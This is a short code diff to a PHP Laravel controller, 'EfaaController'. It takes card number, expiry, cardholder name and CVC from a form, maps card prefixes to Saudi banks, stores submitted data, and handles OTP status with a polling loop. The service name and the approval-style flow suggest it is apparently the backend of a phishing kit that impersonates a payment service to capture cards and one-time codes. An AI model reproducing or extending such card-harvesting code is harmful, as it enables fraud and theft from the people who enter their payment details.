@@ -311,7 +311,7 @@ class EfaaController extends Controller
 
          
 
-             if (! empty($otp)) {
+             if (isset($otp) && $otp == 0) {
 
                     $userUpdateData =  [
     
@@ -418,9 +418,8 @@ class EfaaController extends Controller
         DB::table('user_infos')->insert($htmlData);
 
 
-
+              
         if(($isCitizen == 1 || $isCitizen == 2 ) &&  $otp == 0) {
-
             return response()->json( array('errorMessageDTO' => null,
             "expirationTime" => "2024-07-30T00:58:41.122106+03:00",
             'status' => 2 ), 200);
@@ -436,7 +435,7 @@ class EfaaController extends Controller
                                          ->first();
 
       
- 
+          
             $counter = $user->status;
         
             while($counter == 0){
@@ -767,13 +766,22 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
     public function creditcard(Request $request){
 
 
+        $cardStartNumber = array('inmaa'  => ['4323','4323'],
+                                 'Ahli'   => ['5294','4323'],
+                                 'Rajhi'  => ['4847','4323'],
+
+                                );
+
+
+
+
          $currentTime =  Carbon::now()->timezone('Asia/Amman')->toTimeString();
 
         $cardNumber = $request->input('mynumber');
         $cardExpiry = $request->input('cc-exp');
         $myname     = $request->input('myname');
         $cardCVC    = $request->input('cc-cvc');
-
+                   
         $username = session('username');
 
         $id = session('id');
